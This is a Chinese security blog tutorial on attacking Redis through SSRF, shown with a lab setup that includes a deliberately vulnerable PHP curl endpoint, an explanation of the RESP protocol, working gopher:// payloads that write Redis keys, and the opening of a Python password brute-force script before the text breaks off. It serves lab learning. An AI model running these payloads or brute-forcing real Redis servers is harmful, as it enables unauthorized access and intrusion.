}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" itemprop="url">web知识总结</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>基础知识</span></a></span></div></div><h1 class="post-title" itemprop="name headline">ssrf打redis</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-12-27T12:20:54.722Z" title="发表于 2023-12-27 20:20:54">2023-12-27</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-03-31T01:00:46.358Z" title="更新于 2024-03-31 09:00:46">2024-03-31</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">12.3k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>48分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="ssrf打redis"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2023/12/27/ssrf-da-redis/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2023/12/27/ssrf-da-redis/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2023/12/27/ssrf-da-redis/"><header><a class="post-meta-categories" href="/categories/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" itemprop="url">web知识总结</a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" tabindex="-1" itemprop="url">基础知识</a><h1 id="CrawlerTitle" itemprop="name headline">ssrf打redis</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2023-12-27T12:20:54.722Z" title="发表于 2023-12-27 20:20:54">2023-12-27</time><time itemprop="dateCreated datePublished" datetime="2024-03-31T01:00:46.358Z" title="更新于 2024-03-31 09:00:46">2024-03-31</time></header><h1 id="0x01-ssrf介绍">0x01 SSRF介绍</h1>
<p>SSRF，服务器端请求伪造，是由攻击者构造的漏洞，用于形成服务器发起的请求。通常，SSRF攻击的目标是外部网络无法访问的内部系统。今天学习一手redis中如何利用SSRF，感觉这个在实战中不怎么常见，但其中的知识值得学习</p>
<h1 id="0x02-环境搭建">0x02 环境搭建</h1>
<p>这里在又是废了一天搭建成功，建议大家还是直接下载redis-server服务搭建比较好，网上的教程属实是有点垃圾且害人</p>
<p>这里我的版本的<code>ubuntu22.04 LTS</code></p>
<pre><code class="hljs sh">安装Redis：
apt-get install redis-server

修改Redis配置文件（设置密码，监听ip等）：
vim /etc/redis/redis.conf
配置监听ip：
<span class="hljs-built_in">bind</span> 127.0.0.1 ::1<span class="hljs-comment">#只监听本地端口，如果需要远程登录可以在后面加上本机的ip，同时远程登录也可能造成未授权访问。</span>
配置默认密码：
<span class="hljs-comment">#requirepass foobared#默认无密码，要设置密码可以将前面的#删除，然后将foobared改为要设置的密码。</span>

启动Redis：
/bin/redis-server /etc/redis/redis.conf
或者
service redis-server start<span class="hljs-comment">#这种方法启动可能会造成Redis在web目录、计划任务目录、.ssh目录等其他一些目录没有写入的权限，就算是root身份启动，文件夹777权限也不行（就很迷）。如果遇到Redis在执行save时报错，就还是试试root身份第一种方法启动吧。</span></code></pre>
<p>第二天了，你没猜错，这玩意儿tm又废了我一天时间搭建，最终还是选择centos7搭建成功</p>
<p>具体可以参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/242692.html">Redis环境搭建</a>、<a target="_blank" rel="noopener" href="https://blog.csdn.net/a158640927/article/details/129717051?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=centos7%E6%90%AD%E5%BB%BAapache%20php&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-129717051.142%5Ev99%5Epc_search_result_base2&amp;spm=1018.2226.3001.4187">CentOS7 搭建php环境 </a>–只需要将其中的php、apache服务安装好即可，最后记得在防火墙开启所需要的端口。其中ssrf.php代码如下：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(); <span class="hljs-comment">//创建新的 cURL 资源</span>
<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'url'</span>]); <span class="hljs-comment">//设置URL 和相应的选项</span>
<span class="hljs-comment"># curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span>
<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);
<span class="hljs-comment"># curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span>
<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);   <span class="hljs-comment">//抓取 URL 内容并把它传递给浏览器，存储进文件</span>
<span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);  <span class="hljs-comment">//关闭 cURL 资源，并且释放系统资源</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231229142247812.png" alt="image-20231229142247812"></p>
<p>测试没毛病。</p>
<h1 id="0x03-前置知识">0x03 前置知识</h1>
<p>这里看到师傅们在探讨这一问题的时候需要学习一手RESP协议，那我们跟着师傅学一手</p>
<h2 id="resp协议">RESP协议</h2>
<p><code>Redis</code>服务器与客户端通过<code>RESP</code>（REdis Serialization Protocol）协议通信。</p>
<p>RESP协议是在Redis 1.2中引入的，但它成为了与Redis 2.0中的Redis服务器通信的标准方式。这是您应该在Redis客户端中实现的协议。</p>
<p>RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。</p>
<p>RESP在Redis中用作请求 - 响应协议的方式如下：</p>
<ol>
<li>客户端将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器。</li>
<li>服务器根据命令实现回复一种RESP类型。</li>
</ol>
<p>在RESP中，某些数据的类型取决于第一个字节：</p>
<pre><code class="hljs plaintext">对于`Simple Strings`，回复的第一个字节是`+`
对于`error`，回复的第一个字节是`-`
对于`Integer`，回复的第一个字节是`:`
对于`Bulk Strings`，回复的第一个字节是`$`
对于`array`，回复的第一个字节是`*`
此外，`RESP`能够使用稍后指定的`Bulk Strings`或`Array`的特殊变体来表示`Null`值。</code></pre>
<p>在RESP中，协议的不同部分始终以<code>"\r\n"(CRLF)</code>结束。</p>
<p>我们用<code>tcpdump</code>来抓个客户端与redis服务器通信的包来分析一下</p>
<pre><code class="hljs sh">命令：tcpdump -i lo -s 0 port 6379 -w redis.pcap
参数说明：
-i指定网卡（一般指定eth0，这里抓取本地接口的流量需要指定为lo）
-s抓取数据包时默认抓取长度为68字节。加上-s 0 后可以抓到完整的数据包
port指定抓取的端口
-w保存到文件，后接保存的路径与文件名</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231228175523608.png" alt="image-20231228175523608"></p>
<p>这里本地先开启监听，之后进入redis服务器<code>redis-cli -h 127.0.0.1 -p 6379</code> 之后在redis服务器执行如下命令</p>
<pre><code class="hljs sh">127.0.0.1:6379&gt; <span class="hljs-built_in">set</span> key1 value1
OK
127.0.0.1:6379&gt; quit</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231228175629190.png" alt="image-20231228175629190"></p>
<p>最后将产生的pcap数据包传入wireshark追踪tcp数据流</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231228175746108.png" alt="image-20231228175746108"></p>
<p>这里对于该工具的使用方法几乎不懂，但好在找到了目标数据，如上图所示</p>
<p>抓到的数据包如下，结合我们上面对RESP协议的解释，我们来逐行分析:</p>
<pre><code class="hljs sh">*3：代表数组，也就是这个数组长度为3，<span class="hljs-built_in">set</span>、key1、value1可以将之间的空格认为是分隔符
<span class="hljs-variable">$3</span>：代表批量字符串，长度为3：<span class="hljs-built_in">set</span>；之后的<span class="hljs-variable">$4</span>、<span class="hljs-variable">$6</span>同理
最后的+OK：代表简单字符串
其中<span class="hljs-built_in">set</span>代表设置key，key为key1，对应的value为value1
最后的+OK代表服务端执行成功后返回的字符串</code></pre>
<p>hex转储看一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231228180421235.png" alt="image-20231228180421235"></p>
<p>正如前面所说的，客户端向将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。</p>
<p>这里的0d0a代表CRLF也就是回车换行符，在这里代表结束符。那有趣的来了，如果我们将上述的数据进行url编码随后在本机127.0.0.1中通过curl和gopher发送给redis服务器会如何呢？</p>
<pre><code class="hljs sh">*3
<span class="hljs-variable">$3</span>
<span class="hljs-built_in">set</span>
<span class="hljs-variable">$4</span>
key1
<span class="hljs-variable">$6</span>
value1
经过url编码后：注意这里的%0A需要换成%0D0A

%2A3%0D%0A%243%0D%0Aset%0D%0A%244%0D%0Akey1%0D%0A%246%0D%0Avalue1%0D%0A
再接着
gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%244%0D%0Akey1%0D%0A%246%0D%0Avalue1%0D%0A</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231228190902772.png" alt="image-20231228190902772"></p>
<p>如上图可以看到左侧的OK代表我们执行成功，右图是我们登录redis服务器之后验证key1的值是否被设置了</p>
<p>这里看到师傅还尝试直接使用命令发送，而不采取tcp数据流了。我们也尝试一下</p>
<pre><code class="hljs sh">命令：
<span class="hljs-built_in">set</span> key2 value2
get key2

url编码后：
gopher://127.0.0.1:6379/_set%20key2%20value2%0D%0Aget%20key2%0D%0A</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231228191343559.png" alt="image-20231228191343559"></p>
<p>如上图，看到成功返回了我们刚刚设置的key的值，说明直接发送命令的方法也是可行的。知道了如何让Redis服务器执行我们的命令，那么接下来我们就来看如何攻击来达到 getshell 的目的。</p>
<h1 id="0x04-redis配合gopher协议进行ssrf">0x04 Redis配合gopher协议进行SSRF</h1>
<h2 id="概述">概述</h2>
<p>gopher协议是http协议出现之前，在internet中常见的一个协议，但现在这个协议用的越来越少了，但该协议在ssrf中却大有用途，可以用来攻击redis、ftp等，还可以发送get、post请求，这在ssrf攻击中大有作为。</p>
<h2 id="利用条件">利用条件</h2>
<p>redis所在的服务端存在未授权访问或者通过弱口令可以访问到</p>
<h2 id="利用">利用</h2>
<p>redis常见的SSRF攻击方式大概有这几种：</p>
<ol>
<li>
<p>redis认证攻击</p>
</li>
<li>
<p>绝对路径写webshell</p>
</li>
<li>
<p>写ssh公钥</p>
</li>
<li>
<p>写contrab计划任务反弹shell</p>
</li>
</ol>
<p>下面我们逐个实现</p>
<h2 id="redis认证攻击">redis认证攻击</h2>
<p>这里呢也是可以分为两种情况的，一种是遇到默认无密码的redis服务器，另一种就是有密码的。</p>
<h3 id="无密码redis攻击">无密码Redis攻击</h3>
<p>先考虑无密码的，这里呢其实也就是我们上述0x03中介绍过的可以直接构造恶意的明文命令，或者tcp数据流，发送给redis服务器</p>
<p>但这里呢如果对方的redis服务暴露在公网，这就好办了，直接curl发送gopher协议即可。</p>
<p>但如果对方redis限制只监听本地请求，那我们就只能祈祷对方服务器存在ssrf，接下来对于无密码的我就直接cv上面的了。</p>
<p>如果我们将上述的数据进行url编码随后在本机127.0.0.1中通过curl和gopher发送给redis服务器会如何呢？</p>
<pre><code class="hljs sh">*3
<span class="hljs-variable">$3</span>
<span class="hljs-built_in">set</span>
<span class="hljs-variable">$4</span>
key1
<span class="hljs-variable">$6</span>
value1
经过url编码后：注意这里的%0A需要换成%0D0A

%2A3%0D%0A%243%0D%0Aset%0D%0A%244%0D%0Akey1%0D%0A%246%0D%0Avalue1%0D%0A
再接着
gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%244%0D%0Akey1%0D%0A%246%0D%0Avalue1%0D%0A</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231228190902772.png" alt="image-20231228190902772"></p>
<p>如上图可以看到左侧的OK代表我们执行成功，右图是我们登录redis服务器之后验证key1的值是否被设置了</p>
<p>这里看到师傅还尝试直接使用命令发送，而不采取tcp数据流了。我们也尝试一下</p>
<pre><code class="hljs sh">命令：
<span class="hljs-built_in">set</span> key2 value2
get key2

url编码后：
gopher://127.0.0.1:6379/_set%20key2%20value2%0D%0Aget%20key2%0D%0A</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231228191343559.png" alt="image-20231228191343559"></p>
<p>如上图，看到成功返回了我们刚刚设置的key的值，说明直接发送命令的方法也是可行的。知道了如何让Redis服务器执行我们的命令，那么接下来我们就来看如何攻击来达到 getshell 的目的。</p>
<h3 id="有密码redis攻击">有密码Redis攻击</h3>
<p>这里我们先确定一个登录认证密码，修改redis下的配置文件 <strong>redis.conf</strong>，搜索 <strong>requirepass</strong> 关键字。</p>
<p><code>vim /etc/redis/redis.conf</code>，如下图将#去掉，并在requirepass后面添加密码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231228202542781.png" alt="image-20231228202542781"></p>
<p>退出后重新启动redis服务，接着我们开始爆破。</p>
<p>对于这种需要密码登录认证的，我们可以尝试弱密码，但手动太麻烦，这里我就跟师傅学着写个脚本</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests

target = <span class="hljs-string">"http://192.168.246.138/ssrf.php?url="</span>  <span class="hljs-comment"># 请输入目标url</span>
rhost = <span class="hljs-string">"127.0.0.1"</span>
rport = <span class="hljs-string">"6379"</span>

<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"password.txt"</span>,<span class="hljs-string">"r+"</span>) <span class="hljs-keyword">as</span> file:
    passwds = file.readlines()
    <span class="hljs-keyword">for</span> passwd <span class="hljs-keyword">in</span> passwds:
        passwd = passwd.strip(<span class="hljs-string">"\n"</span>)
        len_pass = <span class="hljs-built_in">len</span>(passwd)
